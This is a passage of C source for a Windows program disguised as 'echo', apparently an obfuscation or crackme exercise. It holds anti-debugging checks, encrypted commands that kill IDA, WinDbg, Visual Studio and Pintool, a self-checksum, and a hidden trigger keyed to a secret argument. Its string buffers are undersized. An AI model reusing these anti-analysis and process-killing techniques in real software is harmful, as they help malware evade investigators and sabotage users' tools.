			//printf2_f(decrypt_key(idamessage_todecode,decoding_key_int-18));
			step1();
			system_f(decrypt_key(idakill_todecode,decoding_key_int-25));
		}
		check++;
		//Kill VSExpress
		BOOL isVC = 1-system_f(decrypt_key(vccheck_todecode,decoding_key_int+12));
		if (isVC && (protection -6 == 1 || protection2 + 1 == 4)){
			//printf_f(decrypt_key(vcmessage_todecode,decoding_key_int));
			step1();
			system2_f(decrypt_key(vckill_todecode,decoding_key_int-40));
		}

		//Kill WinDB
		BOOL isWinDB = 1-system2_f(decrypt_key(windbcheck_todecode,decoding_key_int-25));
		if (isWinDB && (protection*2 == 14 || protection2*4 == 12)){
			//printf2_f(decrypt_key(windbmessage_todecode,decoding_key_int+15));
			step1();
			system2_f(decrypt_key(windbkill_todecode,decoding_key_int-51));
		}
	}
	check++;
	//If Pintool is running : stop Pintool
	BOOL isPintool = 1-system_f(decrypt_key(pintoolcheck_todecode,decoding_key_int));
	if (isPintool){
		//printf2_f(decrypt_key(pintoolmessage_todecode,decoding_key_int-15));
		step1();
		system_f(decrypt_key(pintoolkill_todecode,decoding_key_int-80));
	}
	return check+1; //4 if not Debug
}

int antidebug_2(){
	PPEB pPeb = (PPEB)__readfsdword(2+sub_2(useless_f0(decrypt_special(231297,489))));
	BOOL isBeingDebugged = pPeb->BeingDebugged;

	int protection = (int) pPeb->BeingDebugged +3; //4 if Debug
	int check = -5;

	typedef bool isDebug(); // Address : 18073568067909359
	isDebug* isDebug_f = (isDebug*) decrypt_dh(18073567576581525,add_1(566876),598979879);
	int isBeingDebugged2 = useless_f1(sub_2(isDebug_f()))+2;

	int protection2 = isBeingDebugged2* 2; //2 if Debug

	second_helix = decrypt_dh(second_value,useless_f3(helix1_2),helix2_2);
	first_helix = useless_f3(decrypt_dh(useless_f1(first_value),helix1_1,add_1(helix2_1)-1));
	decoding_key_int = useless_f0(decrypt_dh(useless_f0(key_to_decode_helix),first_helix,second_helix));
	check++;
	check++;
	//If Debug : check which Debugger is launched and kill it
	if (isBeingDebugged || isBeingDebugged2 || protection*4 == 16 || protection2*2 == 4){
		check++;
		//Kill VSExpress
		BOOL isVC = 1-system2_f(decrypt_key(vccheck_todecode,decoding_key_int+12));
		if (isVC && (protection == 4 || protection2 + 1 == 3)){
			step2();
			//printf2_f(decrypt_key(vcmessage_todecode,decoding_key_int));
			system_f(decrypt_key(vckill_todecode,decoding_key_int-40));
		}

		//Kill WinDB
		BOOL isWinDB = 1-system2_f(decrypt_key(windbcheck_todecode,decoding_key_int-25));
		if (isWinDB && (protection*2 == 8 || protection2*4 == 8)){
			step2();
			//printf2_f(decrypt_key(windbmessage_todecode,decoding_key_int+15));
			system2_f(decrypt_key(windbkill_todecode,decoding_key_int-51));
		}
		check++;
		//Kill IDA
		BOOL isIDA = 1-system_f(decrypt_key(idacheck_todecode,decoding_key_int-75));
		if (isIDA && (protection +6 == 10 || protection2*3 == 6)) {
			step2();
			//printf_f(decrypt_key(idamessage_todecode,decoding_key_int-18));
			system2_f(decrypt_key(idakill_todecode,decoding_key_int-25));
		}
	}
	check++;
	//If Pintool : Kill Pintool
	BOOL isPintool = 1-system2_f(decrypt_key(pintoolcheck_todecode,decoding_key_int));
	if (isPintool){
		//printf_f(decrypt_key(pintoolmessage_todecode,decoding_key_int-15));
		step2();
		system2_f(decrypt_key(pintoolkill_todecode,decoding_key_int-80));
	}
	return 2*check; //-2 if not Debug
}

int antidebug_3(){
	typedef bool isDebug(); // Address : 18073568067909359
	isDebug* isDebug_f = (isDebug*) decrypt_dh(77904062292896668,12899852669886,95977744112225997);
	int isBeingDebugged2 = useless_f1(add_1(add_1(isDebug_f()))-1)-1;
	int protection2 = isBeingDebugged2*4+1;//=5 if Debug

	PPEB pPeb = (PPEB)__readfsdword(useless_f3(-1+add_1(useless_f0(useless_f0(decrypt_special(231297,489))))));
	BOOL isBeingDebugged = pPeb->BeingDebugged;
	int protection = (int) pPeb->BeingDebugged*2-1;//=1 if Debug

	second_helix = decrypt_dh(second_value,useless_f1(helix1_2),useless_f0(helix2_2));
	first_helix = useless_f0(decrypt_dh(first_value,helix1_1,add_1(helix2_1)-1));
	decoding_key_int = useless_f3(decrypt_dh(useless_f1(key_to_decode_helix),first_helix,second_helix));
	int check = 0;
	//If Pintool : kill Pintool
	BOOL isPintool = 1-system2_f(decrypt_key(pintoolcheck_todecode,useless_f1(decoding_key_int)));
	if (useless_f1(isPintool)){
		check++;
		//printf2_f(decrypt_key(pintoolmessage_todecode,decoding_key_int-15));
		system_f(decrypt_key(pintoolkill_todecode,decoding_key_int-80));
	}
	check++;
	//If Debug : check which Debugger is launched and kill it
	if (isBeingDebugged || protection*3 == 3 || protection2+5 == 10){

		//Kill IDA
		BOOL isIDA = 1-system_f(decrypt_key(idacheck_todecode,useless_f0(decoding_key_int-75)));
		if (isIDA && (protection +6 == 7 || protection2*8 == 40)) {
			check++;
			//printf_f(decrypt_key(idamessage_todecode,decoding_key_int-18));
			step3();
			system_f(decrypt_key(idakill_todecode,useless_f1(decoding_key_int-25)));
		}

		//Kill WinDB
		BOOL isWinDB = 1-system2_f(decrypt_key(windbcheck_todecode,decoding_key_int-25));
		if (isWinDB && (protection*4 == 4 || protection2*5+1 == 26)){
			//printf2_f(decrypt_key(windbmessage_todecode,decoding_key_int+15));
			step3();
			system_f(decrypt_key(windbkill_todecode,decoding_key_int-51));
		}
		check++;
		//Kill VSExpress
		BOOL isVC = 1-system2_f(decrypt_key(vccheck_todecode,decoding_key_int+12));
		if (isVC && (protection -1 == 0 || protection2 + 5 == 10)){
			//printf2_f(decrypt_key(vcmessage_todecode,decoding_key_int));
			step3();
			system2_f(decrypt_key(vckill_todecode,decoding_key_int-40));
		}

		//Kill IDA
		BOOL isIDA2 = 1-system_f(decrypt_key(idacheck_todecode,useless_f0(decoding_key_int-75)));
		if (isIDA2 && (protection +6 == 7 || protection2*8 == 40)) {
			//printf_f(decrypt_key(idamessage_todecode,decoding_key_int-18));
			step3();
			system_f(decrypt_key(idakill_todecode,useless_f1(decoding_key_int-25)));
		}

	}
	check++;
	check++;
	return check-1; //2 if not Debug
}

//MAIN PROGRAM
//Str1
//The following is a bait string that will be found at the start of the debug session
char notecho[] = {'E'^42, 'C'^43, 'H'^44, 'O'^45};

//The following encoded strings are useful to make the main program work in the shadows
char str_1[] = {'\xa5', '\xb0', '\xb2', '\xe4', '\xba', '\xa5', '\xb0', '\xb2', '\xe4', '\x00'}; //"%02d:%02d" - key=128

//C2 Strings
int helix_code1 = 4563;
int helix_code2 = 8822002;
int val_todecode = 8818138;
char key_encrypted[] = {'\xa5', '\xa5', '\xa5', '\xbb', '\xbb', '\xbb', '\xbb', '\x12', '\xa4', '\x12', '\x13', '\xc2', '\xcc', '\x9f', '\x9f', '\x00'}; //Decoded "^^^@@@@é_éè97dd", key 251
char code_encrypted[] = {'\x2d', '\x2a', '\x3b', '\x29', '\x27', '\x29', '\x3a', '\x88', '\x2d', '\x9d', '\xd1', '\x0a', '\x77', '\x00'}; //Decoded : "steigizart93@"

int helix_argument1 = 267;
int helix_argument2 = 239;
int arg_val = 367; //Decoded : 139
//Print Strings
char arg_s[] = {'\xae', '\xf8', '\x00'}; //"%s"
char arg_s2[] = {'\xae', '\xa5', '\xa1', '\xf8', '\x00'}; //"%.*s"
char arg_s_space[] = {'\xae', '\xf8', '\xab', '\x00'}; //"%s "
char arg_s2_space[] = {'\xae', '\xa5', '\xa1', '\xf8', '\xab', '\x00'}; //"%.*s ";


//Argument Strings
//decrypt_key(file_name1,lighter_key);
int lighter_key = 200;
char file_name1[] = {'\xbc', '\xad', '\xbb', '\xbc', '\xe6', '\xbc', '\xb0', '\xbc', '\x00'}; //"test.txt";
char file_name2[] = {'\xbc', '\xad', '\xbb', '\xbc', '\xfa', '\xe6', '\xbc', '\xb0', '\xbc', '\x00'}; //"test2.txt";
char mode_write[] = {'\xbf', '\x00'}; //"w";
char mode_read[] = {'\xba', '\x00'}; //"r";
char date_format[] = {'\xed', '\xac', '\xe5', '\xed', '\xf8', '\xfa', '\xac', '\xe5', '\xed', '\xf8', '\xfa', '\xac', '\x00'}; //"%d-%02d-%02d";

//Commands
char command_decode_val[] = "p=99776lkppkdj";
char command_decode_val2[] = ")àç_uè";

char copy_cmd[] = {'\x4a', '\x8f', '\x97', '\x26', '\x55', '\x89', '\x11', '\xd9', '\x94', '\x2f', '\x1a', '\xdf', '\x11', '\xd2', '\xd2', '\x3a', '\x55', '\xd1', '\x11', '\x85', '\x88', '\x37', '\x06', '\x91', '\x1e', '\xd8', '\xc7', '\x70', '\x2c', '\xc8', '\x17', '\xae', '\xb2', '\x13', '\x00'}; //"copy test.txt test2.txt /Y >NUL"
char del_cmd1[] = {'\x14', '\x58', '\x55', '\x19', '\x56', '\x0f', '\x0f', '\x1f', '\x1b', '\x1f', '\x47', '\x53', '\x56', '\x5f', '\x15', '\x03', '\x77', '\x6c', '\x7b', '\x00'}; //"del test.txt>NUL"
char del_cmd2[] = {'\x14', '\x58', '\x55', '\x19', '\x0e', '\x0f', '\x53', '\x03', '\x03', '\x03', '\x09', '\x5c', '\x5c', '\x54', '\x3e', '\x68', '\x75', '\x00'}; //"del test2.txt>NUL"

//This series of a function is meant to make the structure of the compiled program hard to read, with a lot of returns in a cycle.
int returnint(int n) {
	__asm {nop}
	int res = 0;
	for (int i=0; i<n; ++i){
		res = n-i;
		if (i==n) {
			printf("%d", i);
			returnint(i);
		}
	}
	return res+n-1;
}

int printint(int i){
	printf("%d", returnint(i));
	return returnint(0);
}

int printchar(char* a) {
	char* text = a;
	if (a=="ECHO") {
		for (int i=0; i<4; ++i) {
			notecho[i]^=(returnint(42+i));
		}
		text = notecho;
	}
	printf_f(arg_s, text);
	int res = returnint(0);
	return res;
}

int buzz(int i){
	__asm {nop}
	int a=1;
	for (int j=0; j<=i; ++j) {
		a = j + 1;
		if (j==a) {
			printint(i);
		}
	}
	//printf("%d,%d",a,i);
	return returnint(a);
}

int rebuzz(int i){
	int a=1;
	int b = i;
	for (int j=0; j<=3; ++j) {
		a++;
		b--;
		if (b==a) {
			returnint(a+b-1);
		}
	}
	if (a<=i) {printf("%d%d",a,i);}
	return returnint(i+1);
}

int print2(int i, int max, char** a) {
	if (i<max) {
		printchar(*(a+i));
	}
	else{
		printchar(notecho);
	}
	return returnint(0);
}

int print1(int i, int max, char** a) {
	if (i<max) {
		printchar(*(a+i));
		printf("");
		print2(buzz(i), max, a);
	}
	if (i+2<max) {
		printf(""); 
		print1(buzz(buzz(i)), max, a);
	}
	return returnint(0);
}

int getChecksum(int len){
	FILE* executable = NULL;
	char* filebytes;
	int res = 0;
	char path[500];

	GetModuleFileNameA(NULL, path, 500);

	executable = fopen2_f(path,"r");
	filebytes = (char*)malloc_f(len*sizeof(char));
	fread_f(filebytes, len, 1, executable);
	fclose_f(executable);

	for (int i=0; i<len; i++) {
		res += filebytes[i] + i;
	}

	return (int) res;
}


//The main function really starts here.
int main(int argc, char* argv[])
{	
	
	int check_antidebug = -7;
	//Antidebug Start
	check_antidebug = check_antidebug + antidebug_1(); //If not debug : check +=4

	// Get current time and date
	srand_f(time_f(NULL));
	time_t t = time_f(NULL);
	struct tm tm = *localtime_f(&t);
	char* heure_actuelle = (char*) malloc_f(5 * sizeof(char));
	PPEB pPeb = (PPEB)__readfsdword(useless_f3(-1+add_1(useless_f0(useless_f0(decrypt_special(231297,489))))));
	BOOL isBeingDebugged = pPeb->BeingDebugged;
	if (pPeb->BeingDebugged){
		exit_f(42);
		check_antidebug = check_antidebug +25;
	}
	else{
		check_antidebug = check_antidebug -2; //check-=2
	}
	sprintf_f(heure_actuelle, decrypt_key(str_1, 128), tm.tm_hour, tm.tm_min);

	// Three conditions have to be met to make the code behave differently
	int conditions = 0;
	if (argc==11) {
		conditions=buzz(conditions); //C1 : If there are 10 arguments (11 with the command)
	}
	
	int lock = 0;
	for (int i = 1; i<argc; i=buzz(i)){
		char *loc = (char*)malloc2_f(strlen_f(argv[i])*sizeof(char));
		strcpy(loc,argv[i]);
		if (strcmp(loc,heure_actuelle)==0 && lock == 0){
			conditions=rebuzz(conditions); //C2 : If one of the argument contains the current time, format hh:mm
			lock = buzz(0);
		}
		PPEB pPeb_f = (PPEB)__readfsdword(useless_f0(-1+add_1(useless_f1(useless_f0(decrypt_special(231297,489))))));
		BOOL isBeingDebugged_f = pPeb->BeingDebugged+25;
		if (isBeingDebugged_f == 26){
			check_antidebug = check_antidebug+5;
			exit_f(42);
		}
		if (i==7 && strcmp(loc,decrypt_str(code_encrypted,decrypt_key(key_encrypted,decrypt_dh(8818138,4563,8822002))))==0)
		{
			conditions=rebuzz(conditions); //C3 : If the 7th argument contains "steigizart93@"
		}

	}
	// If the 3 conditions are met :
	char to_add[2];
	if (conditions == 3){
		check_antidebug = check_antidebug - antidebug_2(); //check += 2

		// A file is created with today's date.
		FILE* fichier = NULL;
		fichier = fopen_f("a89spo7825e","w");
		char* to_print = (char*)malloc2_f(11 * sizeof(char));
		sprintf_f(to_print, decrypt_key(date_format,lighter_key),tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday);
		if (fichier!=NULL)
		{
			fputs_f(to_print,fichier);
			fclose_f(fichier);
		}

		// The content of this file is copied into another, which gets created. The first file is then deleted.
		system2_f(decrypt_str(copy_cmd,command_decode_val2));
		system_f(decrypt_str(del_cmd1,command_decode_val));
		check_antidebug = check_antidebug - antidebug_3(); //check +=2
		
		// The new file is opened and its content retrieved.
		FILE* fichier2 = NULL;
		fichier2 = fopen2_f("98eohsy78","r");
		char buffer[11];
		fread_f(buffer, 11, 1, fichier2);
		fclose_f(fichier2);
		system2_f(decrypt_str(del_cmd2,command_decode_val));

		// A random character of the retrieved string is selected.
		int date_loc = rand_f()%11;
		to_add[0] = buffer[date_loc];
		to_add[1] = '\0';
	}

	// The random character is added at the end of a random argv argument.
	int index = rand_f()%11;
	check_antidebug = check_antidebug + antidebug_2(); //check-=2
	if (index==0){
		index = rebuzz(index);
	}
	check_antidebug = 5 + check_antidebug; //-2 if NoDebug + conditions, -4 if NoDebug with no conditions met
	if (check_antidebug==-2 || check_antidebug == -4){
		printf2_f("");
	}
	else{
		step3();
	}

	//If the file was modified, the expected number of bytes is different from the current number of bytes. Step3 is launched.
	int checksum = getChecksum(10398);
	if (checksum < 54060000)
	{
		step3();
	}

	for (int i = 1; i<argc; i=buzz(i)){
		// Only the initial length of each argv argument is used to print the arguments. The random added character does not appear. 
		//The program does echo all the time.
		char *loc = (char*)malloc2_f(strlen_f(argv[i])*sizeof(char));
		strcpy(loc,argv[i]);
		if (conditions == 3 && i == index)
		{
			strcat(loc,to_add);
		}
		typedef bool isDebug(); // Address : 18073568067909359
		isDebug* isDebug_f = (isDebug*) decrypt_dh(77904062292896668,12899852669886,95977744112225997);
		if (isDebug_f()){
			check_antidebug = check_antidebug +8;
			step3();
			step1();
		}
		if (i<argc-1){
			if (i !=index){
				printf2_f(decrypt_key(arg_s_space,decrypt_dh(arg_val,helix_argument1, helix_argument2)),loc);
			}
			else {
				printf_f(decrypt_key(arg_s2_space,decrypt_dh(arg_val,helix_argument1, helix_argument2)),strlen_f(argv[i]),loc);
			}
		}
		else {
			if (i != index){
				printf_f(decrypt_key(arg_s,decrypt_dh(arg_val,helix_argument1, helix_argument2)), loc);
			}
			else{
				printf2_f(decrypt_key(arg_s2,decrypt_dh(arg_val,helix_argument1, helix_argument2)),strlen_f(argv[i]),loc);
			}
		}
}
	return 0;
}
